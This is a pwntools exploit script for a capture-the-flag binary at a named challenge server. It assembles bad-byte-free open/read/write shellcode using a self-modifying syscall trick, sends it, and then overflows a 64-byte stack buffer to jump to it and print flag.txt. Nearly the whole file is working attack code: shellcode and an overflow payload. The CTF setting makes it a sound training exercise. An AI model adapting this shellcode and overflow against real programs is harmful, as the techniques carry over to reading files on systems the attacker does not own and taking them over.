from pwn import *

context.arch = 'amd64'

# ─── configuration ─────────────────────────────────────────────────────────────
BINARY  = "./vuln"
HOST    = "challenges.cyberguardiansensate.com"
PORT    = 10102

elf = context.binary = ELF(BINARY)
context.log_level = "info"

# ─── connect ───────────────────────────────────────────────────────────────────
if args.REMOTE:
    io = remote(HOST, PORT)
else:
    io = process(BINARY)

# Helper function to generate our null-free syscall gadget
def safe_syscall(idx):
    return f'''
        jmp get_rip_{idx}
    modify_{idx}:
        pop rbx
        inc byte ptr [rbx]
        jmp rbx
    get_rip_{idx}:
        call modify_{idx}
    target_{idx}:
        .byte 0x0e, 0x05
    '''

# Craft the strictly bad-byte-free ORW Shellcode
shellcode_src = f'''
    /* 1. open("flag.txt", O_RDONLY) */
    xor rax, rax          /* Safely create null bytes */
    push rax              /* Push null-terminator for the string */
    mov rax, 0x7478742e67616c66
    push rax              /* Push "flag.txt" */
    mov rdi, rsp          /* rdi points to our null-terminated string */
    xor rsi, rsi          /* rsi = 0 (O_RDONLY) */
    push 2
    pop rax               /* rax = 2 (sys_open) */
    {safe_syscall(1)}

    /* 2. read(fd, rsp, 0x50) */
    mov rdi, rax          /* Move the returned file descriptor into rdi */
    mov rsi, rsp          /* Read directly onto the stack */
    push 0x50
    pop rdx               /* Read up to 80 bytes */
    xor rax, rax          /* rax = 0 (sys_read) */
    {safe_syscall(2)}

    /* 3. write(1, rsp, bytes_read) */
    mov rdx, rax          /* rax contains bytes successfully read */
    push 1
    pop rdi               /* rdi = 1 (stdout) */
    push 1
    pop rax               /* rax = 1 (sys_write) */
    {safe_syscall(3)}
'''

shellcode = asm(shellcode_src)

log.success(f"Shellcode compiled successfully! Size: {len(shellcode)} bytes")

# Step 1: Send the shellcode size, then the shellcode itself
io.sendlineafter(b'>: ', str(len(shellcode)).encode())
io.send(shellcode)

# Step 2: Trigger the Buffer Overflow in vuln()
padding   = b"A" * 64
saved_rbp = b"B" * 8
ret_addr  = p64(0x1337000)

payload = padding + saved_rbp + ret_addr

# Wait briefly for vuln() to prompt, then send the overflow payload
sleep(0.5)
io.sendline(payload)

# Receive the flag
io.interactive()
